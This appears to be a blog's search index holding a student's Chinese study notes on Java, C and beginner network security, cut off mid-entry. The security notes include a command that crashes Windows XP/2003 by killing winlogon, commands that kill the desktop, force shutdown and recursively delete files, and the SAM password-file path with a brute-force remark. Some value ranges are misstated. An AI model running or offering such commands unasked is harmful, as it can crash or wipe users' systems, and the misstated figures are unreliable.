<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Java基础</title>
      <link href="/2022/05/25/Java%E5%9F%BA%E7%A1%80/"/>
      <url>/2022/05/25/Java%E5%9F%BA%E7%A1%80/</url>
      
        <content type="html"><![CDATA[<p>Java基础学习，持续更新ing…<br>语法结构、面向对象核心<br>工具类、集合、异常<br>线程、I/O、反射、注解等</p><a id="more"></a><h1 id="历史背景"><a href="#历史背景" class="headerlink" title="历史背景"></a>历史背景</h1><p>百度进行了解，不想再听了</p><h2 id="Java语言的特点"><a href="#Java语言的特点" class="headerlink" title="Java语言的特点"></a>Java语言的特点</h2><ol><li>跨平台性*：平台（不同厂商芯片）  平台（不同版本的操作系统）</li><li>面向对象*</li><li>简单性：省去了C++多继承、指针等</li><li>健壮性（鲁棒性）：垃圾回收机制、异常处理机制等</li><li>多线程性：并行操作、提高执行性能、线程安全</li><li>大数据开发相关</li></ol><h1 id="环境搭建-amp-编译"><a href="#环境搭建-amp-编译" class="headerlink" title="环境搭建&amp;编译"></a>环境搭建&amp;编译</h1><p><strong>已安装，有需要百度即可</strong><br>JVM：Java Virtual Machine虚拟机，在内存中开辟一块空间，将源文件编译成计算机能识别的字节码。<br>程序储存在哪？——程序就是英文——储存在一个地方（文件）<br>编译：将我们写完的程序（计算机不认识）编译成计算机识别的字节码文件。最终有两个文件，一个源文件，一个字节码文件，储存在硬盘上。<br>计算机硬件组成：主板、CPU、声卡、显卡、网卡、<strong>内存（条形 黑色芯片 寻址 临时执行使用）、硬盘（矩形 机械、固态 扇区 永久性保存）</strong>、电源<br>硬盘上的文件有不同的形式，使用后缀名区分不同的方式：.txt、.doc、.ppt、.xls、.mp3、.exe等，需要运行环境支持。<br>Java源文件.java（可以用文本文档打开）；字节码文件.class<br>JRE：Java Runtime Environment运行环境，JRE里面包含JVM<br>JDK：Java Development Kit开发工具包。javac.exe编译工具、java.exe执行工具</p><h1 id="如何编写一段Java源代码？"><a href="#如何编写一段Java源代码？" class="headerlink" title="如何编写一段Java源代码？"></a>如何编写一段Java源代码？</h1><p>源代码—&gt;一堆英文（按照某种规则）<br>以文件的形式存储在计算机的硬盘上<br>源代码以后缀名.java结尾<br>文件打开里面的内容是一堆按照规律写的英文</p><ol><li>先写一个关键字——&gt;表示类的意思</li><li>类后面给它取个名字——&gt;理论上是可以随便写的，但是有命名规则和规约。<strong>规则</strong>：可以含有字母（区分大小写 敏感 52个关键字）、数字（0-9，可以但不能放在开头）、符号（英文符号_和$）、中文（强烈不推荐——当作不行）。<strong>规约</strong>：类的名字要求<strong>首字母大写</strong>，如果两个以上的单词，每个单词的首字母都大写；起名字要见名知意，建议尽量使用英文单词</li></ol><p><code>Test.java</code>文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public class Demo&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        System.out.println(&quot;阿巴阿巴&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="利用JDK包中提供的工具进行代码的编译与执行"><a href="#利用JDK包中提供的工具进行代码的编译与执行" class="headerlink" title="利用JDK包中提供的工具进行代码的编译与执行"></a>利用JDK包中提供的工具进行代码的编译与执行</h1><p>C:\Program Files\Wavaljdk1.80_201\bin路径下存在一个javac.exe编译工具<br>遇到了两个问题：</p><ol><li>编译工具双击是黑色对话框一闪而过，编译工具是在<strong>doc命令窗口</strong>中才能使用。【win+R，输入cmd，开启一个doc命令窗口，切换位置】</li><li>想要利用编译工具去编译写好的Java源文件，源文件所在的路径与编译工具不在一起。【将这个工具放置在电脑中的某一个位置，这个位置是当前电脑所有目录都可以共同访问到的位置，以后就不用纠结工具在哪儿啦。相当于搭建环境的一个补充，安装JDK，配置环境变量，具体百度】<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac Test.java</span><br><span class="line">java Demo</span><br></pre></td></tr></table></figure></li></ol><h1 id="基本数据类型"><a href="#基本数据类型" class="headerlink" title="基本数据类型"></a>基本数据类型</h1><h2 id="8个基本数据类型"><a href="#8个基本数据类型" class="headerlink" title="8个基本数据类型"></a>8个基本数据类型</h2><h3 id="4个整型"><a href="#4个整型" class="headerlink" title="4个整型"></a>4个整型</h3><p>byte short int long<br><strong>byte 字节型——&gt;8个bit 敏感的单元位</strong><br>1byte==8bit    0 0000000    256种组合<br>用第一个bit位置来记录符号 0正数 1负数<br>数值的范围：<code>-2^7~2^7-1</code>；也就是<code>-128~127</code><br>以下的其他整数类型的依次×2<br><strong>short</strong><br>2字节==16bit   65526种<br><code>-2^15~2^15-1</code>；<code>-32768~32767</code><br><strong>int</strong><br>4字节==32bit<br><code>-2^32~2^32-1</code>；<code>-2147483648~2147483647</code><br><strong>long</strong><br>8字节==64bit</p><h3 id="2个浮点型"><a href="#2个浮点型" class="headerlink" title="2个浮点型"></a>2个浮点型</h3><p>float double<br><strong>float 32bit</strong><br><strong>double 64bit</strong></p><h3 id="1个字符型"><a href="#1个字符型" class="headerlink" title="1个字符型"></a>1个字符型</h3><p>char 16bit 2字节 Unicode编码 0-65535<br>字符中数字和整数的数字冲突，为了以示区分每一个字符的前后各加单引号，例如<code>&#39;a&#39;</code>、<code>&#39;5&#39;</code>、<code>&#39;我&#39;</code><br>为什么英文和符号和数字是一个字节？为什么中文是两个字节?<br>答：ASCII——美国信息交换标准代码</p><h3 id="1个布尔型-1bit"><a href="#1个布尔型-1bit" class="headerlink" title="1个布尔型 1bit"></a>1个布尔型 1bit</h3><p>boolean：true false</p><h2 id="5个引用数据类型"><a href="#5个引用数据类型" class="headerlink" title="5个引用数据类型"></a>5个引用数据类型</h2><p>数组[]<br>类（抽象类）class<br>接口interface<br>枚举enum<br>注解@interface</p><h1 id="Java常量与变量"><a href="#Java常量与变量" class="headerlink" title="Java常量与变量"></a>Java常量与变量</h1><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量代表是程序运行过程中不能再次改变的值<br><em>常量的作用：</em></p><ol><li>固定的值：代表计算过程中经常用到的值，便于程序计算。例如圆周率3.1415926…</li><li>代表一个含义。例如贪吃蛇1234代表上下左右</li></ol><p><em>什么样的值算常量？？</em></p><ol><li>固定不变的值算作常量，可以认为所有基本类型的值是固定不变的，为常量</li><li>特殊的常量：”abc”——&gt;String类型，String是一个引用数据类型，它的值很特殊，可以简单认为是常量</li><li>自己创建的空间存储了一个固定不变的值，例如<code>final int UP=1</code></li></ol><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><p>变量是程序在执行过程中可以改变<br>变量是一个内存空间（小容器）<br>变量在创建（声明）的时候必须指定数据类型、变量空间的名字<br>变量空间里面只能存储一个内容（值、引用）<br>变量空间内的内容可以改变</p><p><strong>变量如何创建/声明</strong><br>格式：<code>数据类型 变量名字;</code>例如：<code>int a;</code>和<code>Stringb;</code><br>需要注意：变量只是一个空间，可以只创建空间，里面不存放内容；变量空间创建后是没有默认内容的，空的；空的变量空间不能拿来使用，否则编译错误。<br><em>创建变量时需要注意命名的问题：</em></p><ol><li>命名规则：字母（大小写敏感）、数字（0-9不能开头）、符号（英文符号_、$）、中文（不推荐）</li><li>命名规约：<br>类名字：首字母大写，两个以上单词，所有单词首字母都大写，SuperPerson；<br>变量名：首字母小写，如果两个以上单词，之后的首字母大写，superPerson，遵循驼峰式命名规则。<br>所有名字都需要见命知意，增强代码可读性</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">public class Test&#123;</span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        byte x;&#x2F;&#x2F;声明一个变量空间，空间名字是x，空间内要求存储的类型是byte整数</span><br><span class="line">        x&#x3D;1;&#x2F;&#x2F;将一个1赋值到x空间中进行存储</span><br><span class="line">        short b&#x3D;2;</span><br><span class="line">        int c&#x3D;3;</span><br><span class="line">        float e&#x3D;3.4F;</span><br><span class="line">        char g&#x3D;&#39;a&#39;;</span><br><span class="line">        boolean h&#x3D;false;</span><br><span class="line">        String i&#x3D;&quot;abc&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>以上创建变量并赋值的过程中，计算机底层做了什么事情？</p><img src="/2022/05/25/Java%E5%9F%BA%E7%A1%80/%E5%88%9B%E5%BB%BA%E5%8F%98%E9%87%8F%E6%97%B6%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%81%9A%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88(1).png" class=""><ol><li>x是什么？变量空间 存储在哪？<br>存储在栈内存中</li><li>1是什么？1是常量 存在哪？<br>常量缓冲区中</li><li>=是什么？=是赋值 做了什么？<img src="/2022/05/25/Java%E5%9F%BA%E7%A1%80/%E5%88%9B%E5%BB%BA%E5%8F%98%E9%87%8F%E6%97%B6%E8%AE%A1%E7%AE%97%E6%9C%BA%E5%81%9A%E4%BA%86%E4%BA%9B%E4%BB%80%E4%B9%88(2).png" class=""></li></ol><p><strong>float e=3.4从double转化到float会有损失</strong><br>1和3.4都是常量值，存储在常量缓冲区中，常量值的存储形式肯定不是十进制，是以二进制形式存储的<br>1——&gt;32bit（int）<br>3.4——&gt;64bit（double）<br><strong>于是定义float类型时在数字后加上</strong><code>f</code>或<code>F</code></p><p>同理，<strong>long类型数字超过int范围后，要在数字后面加</strong><code>L</code><br><code>-2147483648~2147483647</code>是int类型的取值范围<br>如果创建的常量值超过以上范围,程序编译检测的时候会认为数字太大<br>如果我们真的需要那么大的数字必须在后面加<code>L</code>告知</p><p><strong>byte a=1为啥不报错？</strong><br>1——&gt;32bit<br>0000 0000 0000 0000 0000 0000 0000 0001<br>a——&gt;8bit<br>0000 0001<br>=赋值的时候做了一个自动的决定 自动类型转化</p><p><strong>字符和字符串</strong><br>字符 char 基本数据类型 ‘a’<br>字符串 String 引用数据类型 “a”、”abc”、null、””</p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>C_Primer_Plus</title>
      <link href="/2022/04/13/C-Primer-Plus/"/>
      <url>/2022/04/13/C-Primer-Plus/</url>
      
        <content type="html"><![CDATA[<p>《C Primer Plus》学习记录</p><a id="more"></a><h1 id="计算机编程基础知识"><a href="#计算机编程基础知识" class="headerlink" title="计算机编程基础知识"></a>计算机编程基础知识</h1><h2 id="初识C语言"><a href="#初识C语言" class="headerlink" title="初识C语言"></a>初识C语言</h2><h3 id="对编程而言，可移植性意味着什么？"><a href="#对编程而言，可移植性意味着什么？" class="headerlink" title="对编程而言，可移植性意味着什么？"></a>对编程而言，可移植性意味着什么？</h3><p>完美的可移植程序是，其源代码无需修改就能在不同计算机系统中成功编译的程序。</p><h3 id="解释源代码文件、目标代码文件和可执行文件有什么区别？"><a href="#解释源代码文件、目标代码文件和可执行文件有什么区别？" class="headerlink" title="解释源代码文件、目标代码文件和可执行文件有什么区别？"></a>解释源代码文件、目标代码文件和可执行文件有什么区别？</h3><p>源代码文件包含程序员使用的任何编程语言编写的代码。目标代码文件包含机器语言代码，它不必是完整的程序代码。可执行文件包含组成可执行程序的完整机器语言代码。</p><h3 id="编程的7个主要步骤是什么？"><a href="#编程的7个主要步骤是什么？" class="headerlink" title="编程的7个主要步骤是什么？"></a>编程的7个主要步骤是什么？</h3><ol><li>定义程序目标</li><li>设计程序</li><li>编写程序</li><li>编译程序</li><li>运行程序</li><li>测试和调试程序</li><li>护和修改程序</li></ol><h3 id="编译器的任务是什么？"><a href="#编译器的任务是什么？" class="headerlink" title="编译器的任务是什么？"></a>编译器的任务是什么？</h3><p>编译器把源代码（如，用C语言编写的代码）翻译成等价的机器语言代码（也叫作目标代码）。</p><h3 id="链接器的任务是什么？"><a href="#链接器的任务是什么？" class="headerlink" title="链接器的任务是什么？"></a>链接器的任务是什么？</h3><p>链接器把编译器翻译好的源代码以及库代码和启动代码组合起来，生成一个可执行程序。</p><h2 id="C语言概述"><a href="#C语言概述" class="headerlink" title="C语言概述"></a>C语言概述</h2><h3 id="C语言的基本模块是什么？"><a href="#C语言的基本模块是什么？" class="headerlink" title="C语言的基本模块是什么？"></a>C语言的基本模块是什么？</h3><p>它们都叫作函数。</p><h3 id="什么是语法错误？"><a href="#什么是语法错误？" class="headerlink" title="什么是语法错误？"></a>什么是语法错误？</h3><p>语法错误违反了组成语句或程序的规则。<br>这是一个有语法错误的英文例子：Me speak English good.。<br>这是一个有语法错误的C语言例子：printf”Where are the parentheses?”;。</p><h3 id="什么是语义错误？"><a href="#什么是语义错误？" class="headerlink" title="什么是语义错误？"></a>什么是语义错误？</h3><p>语义错误是指含义错误。<br>这是一个有语义错误的英文例子：This sentence isexcellent Czech.。<br>这是一个有语义错误的C语言例子： thrice_n = 3 + n;。</p><h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      
      
      <categories>
          
          <category> C语言 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> C语言 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>计算机网络</title>
      <link href="/2022/04/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/"/>
      <url>/2022/04/08/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<p>计算机网络基础知识</p><a id="more"></a>]]></content>
      
      
      <categories>
          
          <category> 计算机网络 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 计算机网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>千峰网络安全</title>
      <link href="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
      <url>/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</url>
      
        <content type="html"><![CDATA[<p>千峰网络安全入门笔记，持续更新ing…</p><a id="more"></a><h1 id="IP地址详解"><a href="#IP地址详解" class="headerlink" title="IP地址详解"></a>IP地址详解</h1><h2 id="简单局域网构成"><a href="#简单局域网构成" class="headerlink" title="简单局域网构成"></a>简单局域网构成</h2><p>交换机 ——组建局域网（不能联网） #上网需要路由器</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">局域网：一般称为内网</span><br><span class="line">简单局域网构成：交换机，网线，pc(其他IT结构)</span><br><span class="line">交换机：用来组建内网的局域网的设备</span><br></pre></td></tr></table></figure><p><em>硬件系统</em>：网络服务器、网络工作站、网卡以及传输介质和其他互连设备。具有了完整的硬件系统，还不能成为局域网，必须有合适的高层软件才能满足用户的需求。高层软件包括系统软件和应用软件</p><p><em>局域网的系统软件</em>（即网络操作系统）是用户与计算机网络之间的接口。用户只有通过网络操作系统才能实现文件管理、设备管理、通信管理、网络管理，才能实现局域网是由Internet服务的功能。</p><p><em>服务器</em>可分为<code>文件服务器</code>、<code>打印服务器</code>、<code>通信服务器</code>、<code>数据库服务</code>等。文件服务网是局域网上最基本的服务器，用来管理局域网内的文件资源，打印服务器则为用户提供网络共享打印服务。通信服务器主要负责本地局域网与其他局域网、主机系统或远程工作站的通信。而数据库服务器则是为用户提供数据库检索、更新等服务。</p><p><em>网络工作站</em>也称为<em>客户机</em>，可以是一般的个人计算机，也可以是专用电脑，如图形工作站等。工作站可以有自己的操作系统，独立工作。通过运行工作站的网络软件可以访问服务器的共享资源，目前常见的工作站操作系统有Windows Xp、Windows 7、Windows 8和Linux。</p><p><code>网络工作站</code>和<code>服务器</code>之间的连接通过<code>传输介质</code>和<code>网络连接部件</code>来实现。网络连接部件主要包括<code>网卡</code>、<code>中继器</code>、<code>集线器</code>和<code>交换机</code>等。</p><h2 id="IP地址"><a href="#IP地址" class="headerlink" title="IP地址"></a>IP地址</h2><p>IP是<code>Internet Protocol</code>（网际互连协议）的缩写，是<code>TCP/IP</code>体系中的<code>网络层协议</code><br>唯一标识<br>为互联网上的每一个网络和每一台主机分配一个逻辑地址，以此来屏蔽物理地址的差异<br>是一段网络编码(二进制)由32位组成<br>xxxxxxxx.xxxxxxxx.xxxxxxxx.xxxxxxxx 为了便于记忆，写成<em>点分十进制</em><br>X.X.X.X     X范围0-255       例如 10.1.1.1           192.128.1.1</p><p>IP地址是一个<code>32</code>位的二进制数，通常被分割为<code>4个“8位二进制数”（也就是4个字节）</code>。IP地址通常用<code>“点分十进制”</code>表示成（a.b.c.d）的形式，其中，a,b,c,d都是0~255之间的十进制整数。例：<strong>点分十进IP地址</strong><code>（100.4.5.6）</code>，实际上是32位二进制数<code>（01100100.00000100.00000101.00000110）</code></p><p><strong>目的：</strong>提高网络的可扩展性：</p><ol><li>解决互联网问题，实现大规模、异构网络的互联互通</li><li>分割顶层网络应用和底层网络技术之间的耦合关系，以利于两者的独立发展</li></ol><p><code>IP协议</code>(因特网协议)实际上是一套由软件程序组成的协议软件，它把各种不同“帧”统一转换成“IP数据报”格式，这种转换是因特网的一个最重要的特点，使所有各种计算机都能在因特网上实现互通，即具有“开放性”的特点</p><h2 id="子网掩码"><a href="#子网掩码" class="headerlink" title="子网掩码"></a>子网掩码</h2><p>局域网通信规则：在同一个局域网中，所有的IP必须在同一网段中才可以互相通信<br>IP地址构成：网络位+主机位（网络位相同的IP地址，为同一网段）<br>子网掩码：用来确定IP地址的网络位<br>子网掩码如何确认网络位：与255对应的数字为网络位，与0对应的为主机位<br>255.0.0.0<br>255.255.0.0<br>255.255.255.0</p><h2 id="IP地址详解-1"><a href="#IP地址详解-1" class="headerlink" title="IP地址详解"></a>IP地址详解</h2><p><strong>共有地址</strong><br>公有地址（Public address）由Inter NIC负责。这些IP地址分配给注册并向Inter NIC提出申请的组织机构。通过它<code>直接</code>访问因特网</p><p><strong>私有地址</strong><br>私有地址（Private address）属于非注册地址，专门为组织机构内部使用。</p><img src="/2020/06/10/%E5%8D%83%E5%B3%B0%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/IP%E5%9C%B0%E5%9D%80%E7%BC%96%E5%9D%80%E6%96%B9%E5%BC%8F.png" class=""><p>国际标准组织ISO定义地址分类，五大类（以IP地址第一位进行区分）<br>单播地址        子网掩码可修改<br><code>A类 1-126 默认子网掩码 255.0.0.0</code><br><code>B类 128-191 默认子网掩码 255.255.0.0</code><br><code>C类 192-223 默认子网掩码 255.255.255.0</code><br>组播地址<br><code>D类 224-239</code><br>科研使用<br><code>E类 240-254</code><br>主机位置置0表示<code>网段</code><br>所在网段可用IP地址255-1=254，<code>全0或255</code>不可用，255表示广播地址（所有人）<br><code>127.0.0.1</code>回环地址/自己</p><p><strong>特殊的网址</strong></p><ol><li>每一个字节都为0的地址（“0.0.0.0”）对应于当前主机；</li><li>IP地址中的每一个字节都为1的IP地址（“255．255．255．255”）是当前子网的广播地址；</li><li>IP地址中凡是以“11110”开头的E类IP地址都保留用于将来和实验使用。</li><li>IP地址中不能以十进制“127”作为开头，该类地址中数字127．0．0．1到127．255．255．255用于回路测试，如：127.0.0.1可以代表本机IP地址，用“<a href="http://127.0.0.1”就可以测试本机中配置的Web服务器。" target="_blank" rel="noopener">http://127.0.0.1”就可以测试本机中配置的Web服务器。</a></li><li>网络ID的第一个6位组也不能全置为“0”，全“0”表示本地网络。</li></ol><h2 id="网关"><a href="#网关" class="headerlink" title="网关"></a>网关</h2><p>网关：一个网络的出口Gateway=GW       一般网关在路由器上<br>路由器：可用连接内外网的设备<br><code>/*网关：正常是该网断的第一个或最后一个*/</code></p><h3 id="PC向外发包"><a href="#PC向外发包" class="headerlink" title="PC向外发包"></a>PC向外发包</h3><ol><li>首先判断目标IP地址与自己是否在同一网段</li><li>如果在同一网段，则直接发出去，而不找网关</li><li>如果不在同一网段，直接发包给网关</li></ol><h2 id="DNS"><a href="#DNS" class="headerlink" title="DNS"></a>DNS</h2><p>DNS：Domain Name Service 域名服务<br>备注：一台机器需要连接外网，需要<code>IP地址</code>，<code>子网掩码</code>，<code>网关</code>，<code>DNS</code>四大参数</p><h2 id="配置IP地址"><a href="#配置IP地址" class="headerlink" title="配置IP地址"></a>配置IP地址</h2><p>虚拟机实验，待补充</p><h2 id="网络测试命令"><a href="#网络测试命令" class="headerlink" title="网络测试命令"></a>网络测试命令</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ipconfig     #查看IP地址的基本信息</span><br><span class="line">ipconfig &#x2F;all     #查看IP地址的详细信息</span><br><span class="line">ping x.x.x.x（目标IP地址）      #测试网速，有去有回即为成功通信</span><br><span class="line">ping -t x.x.x.x        #一直ping</span><br><span class="line">ping -n 数字 x.x.x.x       #修改ping包的数量</span><br><span class="line">ping -l 数字 x.x.x.x      #修改ping包的大小</span><br></pre></td></tr></table></figure><p>注：*如果ping不通，可能对方不在线，或者对方开启了防火墙</p><p>手工解析域名     如：<br>nslookup <a href="http://www.jd.com" target="_blank" rel="noopener">www.jd.com</a>        手工解析域名中IP地址</p><h1 id="进制转换"><a href="#进制转换" class="headerlink" title="进制转换"></a>进制转换</h1><p>后面补充</p><h1 id="基本DOS命令"><a href="#基本DOS命令" class="headerlink" title="基本DOS命令"></a>基本DOS命令</h1><p>后面补充</p><h1 id="批处理编写"><a href="#批处理编写" class="headerlink" title="批处理编写"></a>批处理编写</h1><h2 id="批处理作用"><a href="#批处理作用" class="headerlink" title="批处理作用"></a>批处理作用</h2><p>自上而下成批的处理每一条命令，直到执行最后一条</p><h2 id="如何创建批处理"><a href="#如何创建批处理" class="headerlink" title="如何创建批处理"></a>如何创建批处理</h2><p>扩展名  .bat<br>创建方法：新建一个记事本文件，然后扩展名改成  .bat<br>案例</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">d:</span><br><span class="line">cd \</span><br><span class="line">cd tmp</span><br><span class="line">del . &#x2F;s&#x2F;q</span><br></pre></td></tr></table></figure><p>%userfrofile% 变量（用户名）</p><h2 id="批处理基本语法"><a href="#批处理基本语法" class="headerlink" title="批处理基本语法"></a>批处理基本语法</h2><h3 id="echo-off"><a href="#echo-off" class="headerlink" title="@echo off"></a>@echo off</h3><p>作用：关闭回显功能，也就是屏蔽过程，建议放置在批处理首行</p><h3 id="pause"><a href="#pause" class="headerlink" title="pause"></a>pause</h3><p>作用：暂停批处理运行</p><h3 id="title"><a href="#title" class="headerlink" title="title"></a>title</h3><p>作用：为批处理脚本设置标题</p><h3 id="echo"><a href="#echo" class="headerlink" title="echo."></a>echo.</h3><p>作用：在执行批处理脚本时，可以空一行</p><h3 id="set"><a href="#set" class="headerlink" title="set"></a>set</h3><p>作用：设置变量，常用在与脚本的互动赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">互动赋值：set &#x2F;p time&#x3D;输入时间：</span><br><span class="line">引用变量：%time%</span><br></pre></td></tr></table></figure><h3 id="和goto"><a href="#和goto" class="headerlink" title=":和goto"></a>:和goto</h3><p>：定义标签名<br>goto实现跳转</p><h3 id="例子："><a href="#例子：" class="headerlink" title="例子："></a>例子：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title ****</span><br><span class="line">color 0a</span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">echo       1、定时关机</span><br><span class="line">echo       2、取消定时</span><br><span class="line">echo       3、退出</span><br><span class="line">echo &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">set &#x2F;p num&#x3D;您的选择：</span><br><span class="line">if “%num%”&#x3D;&#x3D;“1” goto 1</span><br><span class="line">if “%num%”&#x3D;&#x3D;“2” goto 2</span><br><span class="line">if “%num%”&#x3D;&#x3D;“3” goto 3</span><br><span class="line">echo 别tm瞎输入，好好输入，别闹</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:1</span><br><span class="line">set &#x2F;p a&#x3D;请输入时间(s)</span><br><span class="line">shutdown -s -f -t %a%</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:2</span><br><span class="line">shutdown -a</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:3</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>针对xp或2003的蓝屏命令<code>ntsd -c q -pn winlogon.exe</code>强制杀死进程<br><code>taskkill /im explorer.exe</code>强制杀死桌面</p><h1 id="用户与组管理"><a href="#用户与组管理" class="headerlink" title="用户与组管理"></a>用户与组管理</h1><h2 id="服务器系统版本介绍"><a href="#服务器系统版本介绍" class="headerlink" title="服务器系统版本介绍"></a>服务器系统版本介绍</h2><p>windows服务器系统：win2000，win2003，win2008，win2012<br>Linux服务器系统：Redhat，Centos</p><h2 id="用户管理"><a href="#用户管理" class="headerlink" title="用户管理"></a>用户管理</h2><h3 id="用户概述"><a href="#用户概述" class="headerlink" title="用户概述"></a>用户概述</h3><p>每一个用户登陆系统后，拥有不同的操作权限<br>每一个账户有自己唯一的SID（安全标识符）<br>用户SID：……………-……<br>系统SID：……………           ……用户id：UID        ……………系统id</p><p>windows系统管理员administrator的UID是500<br>普通用户的UID是1000开始<br>不同账户拥有不同的权限，为不同的账户赋权限也就是为不同帐户SID赋权限</p><p>查看sid值：whoami /user<br>账户密码存储位置 c:\windows\system32\config\SAM      #暴力破解 撞库<br>windows系统上，默认密码最长有效期42天</p><h3 id="内置账户"><a href="#内置账户" class="headerlink" title="内置账户"></a>内置账户</h3><h4 id="给人使用的账户"><a href="#给人使用的账户" class="headerlink" title="给人使用的账户"></a>给人使用的账户</h4><p><code>administrator</code>     #管理员帐户<br><code>guest</code>        #来宾账户</p><h4 id="计算机服务组件相关的系统账户"><a href="#计算机服务组件相关的系统账户" class="headerlink" title="计算机服务组件相关的系统账户"></a>计算机服务组件相关的系统账户</h4><p><code>system</code>         #系统账户==权限至高无上<br><code>local service</code> # 本地服务账户==权限等于普通用户<br><code>network service</code> #网络服务账户==权限等于普通用户</p><h4 id="配置文件"><a href="#配置文件" class="headerlink" title="配置文件"></a>配置文件</h4><p>每个用户都有自己的配置文件（家目录），在用户第一次登陆的时候自动产生，路径是<br>win7/win2008  <code>c:\用户\</code><br>xp/win2003    <code>c:\Documents and Settings\</code></p><p><code>net user</code>#列出当前计算机用户列表<br><code>net user 用户名</code>#查看该用户详细信息<br><code>net user 用户名 新密码</code> #给用户修改密码<br><code>net user 用户名 密码</code> /add #新建用户<br><code>net user 用户名 /del</code>#删除用户<br><code>net user 用户名 /active:yes(no)</code> #激活（禁用）账户</p><h2 id="组管理"><a href="#组管理" class="headerlink" title="组管理"></a>组管理</h2><h3 id="组概述"><a href="#组概述" class="headerlink" title="组概述"></a>组概述</h3><p>组的作用：简化权限的赋予<br>赋权限方式：用户—组—赋权限           用户—赋权限</p><h3 id="内置组"><a href="#内置组" class="headerlink" title="内置组"></a>内置组</h3><p>内置组的权限默认已经被系统赋予</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">administrator</span><br><span class="line">guests</span><br><span class="line">users</span><br><span class="line">network</span><br><span class="line">print</span><br><span class="line">Remote Desktop</span><br></pre></td></tr></table></figure><h3 id="组管理命令"><a href="#组管理命令" class="headerlink" title="组管理命令"></a>组管理命令</h3><p><code>net localgroup</code> #列出所有组列表<br><code>net localgroup 组名</code> #查看组成员<br><code>net localgroup 组名 用户名 /add</code>#把用户添加到组中<br><code>net localgroup 组名 用户名 /del</code> # 从组中删除<br><code>net localgroup 组名 /add</code>#新建一个组</p><h1 id="服务器远端管理"><a href="#服务器远端管理" class="headerlink" title="服务器远端管理"></a>服务器远端管理</h1><h2 id="远程管理模型"><a href="#远程管理模型" class="headerlink" 